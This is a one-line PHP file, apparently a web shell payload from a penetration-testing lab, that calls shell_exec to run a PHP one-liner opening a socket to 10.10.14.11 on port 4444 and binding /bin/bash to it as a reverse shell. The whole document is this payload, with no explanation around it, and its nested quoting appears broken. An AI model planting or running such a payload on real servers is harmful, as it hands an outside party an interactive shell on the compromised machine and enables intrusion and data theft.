<?php echo shell_exec("php -r '$sock=fsockopen("10.10.14.11",4444);system("/bin/bash <&3 >&3 2>&3");'");?>
